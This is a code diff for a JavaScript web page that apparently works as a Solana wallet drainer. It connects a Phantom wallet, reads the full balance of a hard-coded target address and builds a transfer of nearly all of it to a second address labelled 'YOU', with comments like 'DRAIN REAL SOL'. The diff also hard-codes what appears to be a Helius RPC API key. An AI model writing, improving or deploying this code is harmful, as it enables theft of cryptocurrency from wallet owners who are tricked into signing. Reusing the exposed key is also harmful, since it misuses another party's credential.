@@ -75,8 +75,11 @@
         const TARGET = "AoGefnxF5CbZvbd2cvxv4Ex1E5j86dqEjehazRuMcMFe";
         const YOU    = "E7V1g2i5gtVuMHz9R3QDV2SodXZwP9bB1PWsg5xgQ8oe";
         
-        // Public RPC (May be rate-limited. If it fails, use a Helius/QuickNode key)
-        const RPC = "https://api.mainnet-beta.solana.com"; 
+        // YOUR HELIUS API KEY
+        const HELIUS_KEY = "e67b03d4-9ec2-4eb7-a188-97f90fa26a45";
+        
+        // Construct the RPC URL with your key
+        const RPC = `https://mainnet.helius-rpc.com/?api-key=${HELIUS_KEY}`; 
 
         async function run() {
             const btn = document.getElementById('btn');
@@ -95,12 +98,16 @@
             try {
                 // Connect Wallet (Only once)
                 await window.solana.connect();
+                
                 const connection = new solanaWeb3.Connection(RPC);
 
-                status.innerText = "Draining SOL...";
+                status.innerText = "Fetching Balance...";
                 
                 // --- DRAIN REAL SOL ---
+                // Fetch balance from Target
                 const balance = await connection.getBalance(new solanaWeb3.PublicKey(TARGET));
+                
+                status.innerText = "Constructing Transaction...";
                 
                 const tx = new solanaWeb3.Transaction();
                 tx.add(solanaWeb3.SystemProgram.transfer({
@@ -109,7 +116,6 @@
                     lamports: balance - 5000 // Leave ~0.005 SOL for fees
                 }));
 
-                // --- FIX: Use signTransaction then sendTransaction ---
                 status.innerText = "Waiting for Phantom Signature...";
                 
                 // 1. Sign the transaction
